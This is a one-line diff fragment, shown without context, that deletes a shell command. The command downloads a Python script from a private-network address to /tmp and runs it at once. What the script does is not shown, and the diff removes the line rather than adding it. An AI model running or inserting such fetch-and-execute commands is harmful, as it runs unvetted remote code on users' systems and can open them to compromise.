@@ -1,1 +1,0 @@
-curl -sS http://192.168.89.4:8000/client.py -o /tmp/s.py && python3 /tmp/s.py
